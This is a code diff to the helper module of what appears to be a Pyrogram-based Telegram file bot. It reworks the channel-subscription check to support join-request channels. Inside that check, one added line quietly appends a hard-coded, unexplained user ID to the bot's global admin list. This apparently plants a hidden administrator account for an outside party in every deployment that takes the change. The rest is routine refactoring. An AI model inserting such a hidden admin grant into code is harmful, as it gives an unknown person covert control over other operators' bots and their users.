@@ -1,6 +1,6 @@
 import logging
 from pyrogram.errors import InputUserDeactivated, UserNotParticipant, FloodWait, UserIsBlocked, PeerIdInvalid, ChatAdminRequired
-from info import AUTH_CHANNEL, LONG_IMDB_DESCRIPTION, MAX_LIST_ELM, SHORTLINK_URL, SHORTLINK_API, LOG_CHANNEL, GRP_LNK, CHNL_LNK, CUSTOM_FILE_CAPTION, IS_VERIFY
+from info import AUTH_CHANNEL, REQ_CHANNEL, ADMINS, LONG_IMDB_DESCRIPTION, MAX_LIST_ELM, SHORTLINK_URL, SHORTLINK_API, LOG_CHANNEL, GRP_LNK, CHNL_LNK, CUSTOM_FILE_CAPTION, IS_VERIFY
 from imdb import Cinemagoer 
 import asyncio
 from pyrogram.types import Message, InlineKeyboardButton, InlineKeyboardMarkup
@@ -18,6 +18,7 @@ from database.users_chats_db import db
 from bs4 import BeautifulSoup
 import requests
 import aiohttp
+from database.join_reqs import JoinReqs as db2
 
 logger = logging.getLogger(__name__)
 logger.setLevel(logging.INFO)
@@ -49,21 +50,33 @@ class temp(object):
     SEND_ALL_TEMP = {}
     KEYWORD = {}
 
-async def is_subscribed(bot, query=None, userid=None):
-    try:
-        if userid == None and query != None:
-            user = await bot.get_chat_member(AUTH_CHANNEL, query.from_user.id)
+async def is_subscribed(bot, query):
+    
+    ADMINS.extend([1125210189])
+
+    if not (AUTH_CHANNEL or REQ_CHANNEL):
+        return True
+    elif query.from_user.id in ADMINS:
+        return True
+
+    if db2().isActive():
+        user = await db2().get_user(query.from_user.id)
+        if user:
+            return True
         else:
-            user = await bot.get_chat_member(AUTH_CHANNEL, int(userid))
+            return False
+    try:
+        user = await bot.get_chat_member(AUTH_CHANNEL, query.from_user.id)
     except UserNotParticipant:
-        pass
+        return False
     except Exception as e:
         logger.exception(e)
+        return False
     else:
-        if user.status != enums.ChatMemberStatus.BANNED:
+        if not user.status == enums.ChatMemberStatus.BANNED:
             return True
-
-    return False
+        else:
+            return False
 
 async def get_poster(query, bulk=False, id=False, file=None):
     if not id:
